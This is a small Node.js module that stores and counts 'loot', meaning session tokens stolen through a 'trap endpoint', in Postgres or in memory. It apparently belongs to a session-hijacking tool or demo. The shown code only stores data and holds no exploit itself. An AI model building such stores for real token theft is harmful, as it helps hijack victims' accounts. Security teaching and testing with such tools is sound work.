// Stolen session tokens received through the trap endpoint. Two backends:
//   - DATABASE_URL set  -> Postgres (survives restarts; see ../infrastructure/postgresLootStore)
//   - otherwise           -> bounded, in-memory, ephemeral (dev default)
const MAX_LOOT_ENTRIES = 200;
const loots = [];

const postgres = process.env.DATABASE_URL ? require('../infrastructure/postgresLootStore') : null;

async function addLoot(entry) {
  if (postgres) return postgres.addLoot(entry);
  loots.push(entry);
  if (loots.length > MAX_LOOT_ENTRIES) loots.shift();
  return entry;
}

async function recentLoots(limit = 50) {
  if (postgres) return postgres.recentLoots(limit);
  return loots.slice(-limit).reverse();
}

async function clearLoots() {
  if (postgres) return postgres.clearLoots();
  loots.length = 0;
}

async function lootCounters() {
  if (postgres) return postgres.lootCounters();
  return {
    executions: loots.length,
    stolen: loots.filter(l => l.stolen).length,
    empty: loots.filter(l => !l.stolen).length,
  };
}

async function init() {
  if (postgres) await postgres.ensureSchema();
}

module.exports = { addLoot, recentLoots, clearLoots, lootCounters, init };
